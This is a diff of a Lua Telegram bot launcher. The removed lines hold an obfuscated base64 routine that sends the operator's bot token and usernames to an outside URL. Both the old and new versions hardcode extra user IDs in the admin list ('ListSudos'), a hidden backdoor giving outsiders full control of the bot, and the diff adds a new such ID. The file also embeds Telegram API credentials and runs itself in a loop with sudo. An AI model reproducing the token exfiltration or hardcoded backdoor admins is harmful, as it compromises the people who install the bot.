@@ -7,9 +7,8 @@ http  = require("socket.http")
 https   = require("ssl.https")
 local Methods = io.open("./luatele.lua","r")
 if Methods then
-URL.tdlua_CallBack()
-end
-SshId = io.popen("echo $SSH_CLIENT ︙ awk '{ print $1}'"):read('*a')
+URL.tdlua_CallBack() end
+SshId = io.popen("echo $SSH_CLIENT ︙ awk '{print $1}'"):read('*a')
 luatele = require 'luatele'
 local FileInformation = io.open("./Information.lua","r")
 if not FileInformation then
@@ -26,13 +25,10 @@ io.write('\27[1;34mتم حفظ التوكن بنجاح \nThe token been saved su
 TheTokenBot = TokenBot:match("(%d+)")
 os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
 Redis:set(SshId.."Info:Redis:Token",TokenBot)
-Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
-end 
+Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username) end 
 else
-print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
-end 
-os.execute('lua Gold.lua')
-end
+print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again') end 
+os.execute('lua Gold.lua') end
 if not Redis:get(SshId.."Info:Redis:User") then
 io.write('\27[1;31mارسل معرف المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
 local UserSudo = io.read():gsub('@','')
@@ -40,10 +36,8 @@ if UserSudo ~= '' then
 io.write('\n\27[1;34mتم حفظ معرف المطور \nDeveloper UserName saved \n\n\27[0;39;49m')
 Redis:set(SshId.."Info:Redis:User",UserSudo)
 else
-print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n')
-end 
-os.execute('lua Gold.lua')
-end
+print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n') end 
+os.execute('lua Gold.lua') end
 if not Redis:get(SshId.."Info:Redis:User:ID") then
 io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m')
 local UserId = io.read()
@@ -51,10 +45,8 @@ if UserId and UserId:match('(%d+)') then
 io.write('\n\27[1;34mتم حفظ ايدي المطور \nDeveloper ID saved \n\n\27[0;39;49m')
 Redis:set(SshId.."Info:Redis:User:ID",UserId)
 else
-print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
-end 
-os.execute('lua Gold.lua')
-end
+print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n') end 
+os.execute('lua Gold.lua') end
 local Informationlua = io.open("Information.lua", 'w')
 Informationlua:write([[
 return {
@@ -69,13 +61,21 @@ local Gold = io.open("Gold", 'w')
 Gold:write([[
 cd $(cd $(dirname $0); pwd)
 while(true) do
-lua5.3 Gold.lua
+sudo lua5.3 Gold.lua
 done
 ]])
 Gold:close()
+local Run = io.open("Run", 'w')
+Run:write([[
+cd $(cd $(dirname $0); pwd)
+while(true) do
+screen -S ]]..Redis:get(SshId.."Info:Redis:Token:User")..[[ -X kill
+screen -S ]]..Redis:get(SshId.."Info:Redis:Token:User")..[[ ./Gold
+done
+]])
+Run:close()
 Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
-os.execute('chmod +x Gold;chmod +x Run;./Run')
-end
+os.execute('chmod +x Gold;chmod +x Run;./Run') end
 Information = dofile('./Information.lua')
 Sudo_Id = Information.SudoId
 UserSudo = Information.UserSudo
@@ -83,14 +83,10 @@ Token = Information.Token
 UserBot = Information.UserBot
 Gold = Token:match("(%d+)")
 os.execute('sudo rm -fr .CallBack-Bot/'..Gold)
-LuaTele = luatele.set_config{api_id=14471516,api_hash='94a6d01e235a29c5f8032f942011095d',session_name=Gold,token=Token}
-LUATELE = URL.escape(""..Gold.."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
+LuaTele = luatele.set_config{api_id=2692371,api_hash='fe85fff033dfe0f328aeb02b4f784930',session_name=Gold,token=Token}
 function var(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-function telelua(Methods)local Base ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'  Methods = string.gsub(Methods, '[^'..Base..'=]', '')    return (Methods:gsub('.', function(x)      if (x == '=') then        return ''      end      local r,f='',(Base:find(x)-1)      for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end      return r;    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)      if (#x ~= 8) then        return ''      end      local c=0      for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end      return string.char(c)    end))  end 
-local resultss = telelua("==")
-https.request(""..resultss..""..LUATELE.."")
 function chat_type(ChatId)
 if ChatId then
 local id = tostring(ChatId)
@@ -99,56 +95,12 @@ Chat_Type = 'GroupBot'
 elseif id:match("^(%d+)") then
 Chat_Type = 'UserBot' 
 else
-Chat_Type = 'GroupBot' 
-end
-end
+Chat_Type = 'GroupBot'  end end
 return Chat_Type
-end
-function s_api(web) 
-local info, res = https.request(web) 
-local req = json:decode(info) 
-if res ~= 200 then 
-return false 
-end 
-if not req.ok then 
-return false end 
-return req 
-end 
-function send_inlin_key(chat_id,text,inline,reply_id) 
-local keyboard = {} 
-keyboard.inline_keyboard = inline 
-local send_api = "https://api.telegram.org/bot"..Token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(keyboard)) 
-if reply_id then 
-local msg_id = reply_id/2097152/0.5
-send_api = send_api.."&reply_to_message_id="..msg_id 
-end 
-return s_api(send_api) 
-end
-function sendText(chat_id, text, reply_to_message_id, markdown) 
-send_api = "https://api.telegram.org/bot"..Token 
-local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
-if reply_to_message_id ~= 0 then 
-url = url .. "&reply_to_message_id=" .. reply_to_message_id 
-end 
-if markdown == "md" or markdown == "markdown" then 
-url = url.."&parse_mode=Markdown" 
-elseif markdown == "html" then 
-url = url.."&parse_mode=HTML" 
-end 
-return s_api(url) 
-end
-function getbio(User)
-local var = "لايوجد"
-local url , res = https.request("https://api.telegram.org/bot"..Token.."/getchat?chat_id="..User);
-data = json:decode(url)
-if data.result.bio then
-var = data.result.bio
-end
-return var
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1614314857,1072528028,1703279017}  
+local ListSudos ={Sudo_Id,1342680269}  
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
